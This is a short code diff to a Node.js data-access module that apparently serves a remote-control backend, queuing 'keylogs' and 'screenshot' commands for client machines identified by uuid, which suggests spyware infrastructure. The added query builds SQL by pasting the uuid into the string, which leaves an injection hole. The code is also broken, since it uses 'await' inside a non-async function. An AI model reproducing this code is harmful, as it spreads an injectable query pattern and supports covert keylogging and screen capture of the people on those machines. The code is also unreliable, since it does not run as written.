@@ -2,6 +2,7 @@
 
 const Command = require('../models/Command')
 const { QueryTypes } = require('sequelize')
+const commandService = require('../services/commandService')
 
 const commandDao = {
 
@@ -33,14 +34,17 @@ const commandDao = {
         return command
     },
     findPendingCommandsByUuid: function (uuid) {
-        //Faire la requete à la base de donnée
-        //SELECT commandName FROM Command WHERE uuid = :uuid AND pending = 1 (true)
+       
+        const sql = `SELECT "commandName" FROM "${Command.tableName}" WHERE uuid = '${uuid}' AND pending = 1`
 
-        return [
-            'keylogs',
-            'screenshot',
-            'keylogs'
-        ]
+        const commands = await Command.sequelize.query(sql, {
+            type: QueryTypes.SELECT,
+            plain: true,
+            mapToModel: true,
+            model: Command
+        })
+
+        return commands
     },
 
     insertOne: async function ({ commandName, fk_clientId, fk_userId}) {
